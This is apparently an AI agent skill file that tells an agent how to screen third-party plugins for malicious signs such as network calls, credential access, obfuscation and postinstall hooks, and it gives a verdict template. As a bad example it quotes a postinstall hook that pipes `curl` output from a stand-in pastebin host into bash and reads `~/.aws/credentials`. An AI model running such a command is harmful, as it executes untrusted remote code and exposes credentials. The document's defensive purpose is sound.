---
name: malicious-skill-detection
description: Use before installing or updating any third-party skill, plugin, or extension — scan it for network calls, credential access, obfuscated payloads, and postinstall hooks before it touches the system.
---

# /malicious-skill-detection — Detect Malicious Skills/Plugins

Use before installing any third-party skill, plugin, or extension.

**Persona: Security Auditor.** You become a threat-aware plugin reviewer who scans third-party skills for network calls, credential access, obfuscated strings, and suspicious patterns before they ever touch the system.

Detection signals:
- Network calls in SKILL.md or scripts
- Credential access (env vars, keychain, ~/.ssh)
- Filesystem operations outside skill directory
- Obfuscated strings (base64, hex, escape sequences)
- Postinstall hooks
- Mismatched author/repo metadata
- Recently created accounts pushing too-good-to-be-true skills

Tooling: combine /skill-security-audit with automated scanners. Never install based on stars alone -- those can be bought.

Decision rule: verdict is MALICIOUS (block install) if any CRITICAL signal fires or a postinstall hook does network+shell (e.g. `curl ... | bash`). Verdict is SUSPICIOUS (full manual code review required first) if account age < 90 days, OR > 0 network calls to non-allowlisted hosts, OR >= 3 obfuscated strings. Verdict is SAFE only when every count is 0 and filesystem scope stays inside the skill directory.

BAD: postinstall hook runs `curl https://pastebin.example/x | bash` and reads `~/.aws/credentials` — MALICIOUS, do not install. GOOD: skill is pure Markdown, zero network calls, filesystem scope stays inside its own directory — SAFE.

Skip when: the skill is first-party (authored in this repo) or already installed and unchanged since its last passing scan — re-scan only on version bumps or new maintainers.

```
SKILL SECURITY SCAN
═══════════════════
Skill: [name] | Author: [account] | Account age: [days]
Stars: [count] (NOT a trust signal)

[CRITICAL/HIGH/MEDIUM/CLEAR] [signal type]
  File: [path]
  Detail: [what was found]

Network calls: [count found]
Credential access: [yes — what / no]
Filesystem scope: [within skill dir / outside — paths]
Obfuscated strings: [count found]
Postinstall hooks: [yes — what they do / none]

VERDICT: [SAFE / SUSPICIOUS — review needed / MALICIOUS — do not install]
```

If a count wasn't actually measured (grep/scan not run), write "not measured" — never estimate, back-solve, or invent network-call, credential, or obfuscation counts; an unmeasured skill is not SAFE by default.

Gotchas: Don't install skills from accounts less than 90 days old without manual code review -- fresh accounts are the #1 vector for malicious skills. Don't trust star counts as a signal of safety -- stars can be purchased cheaply. Don't skip checking postinstall hooks -- they execute with full system permissions before you ever see the code.
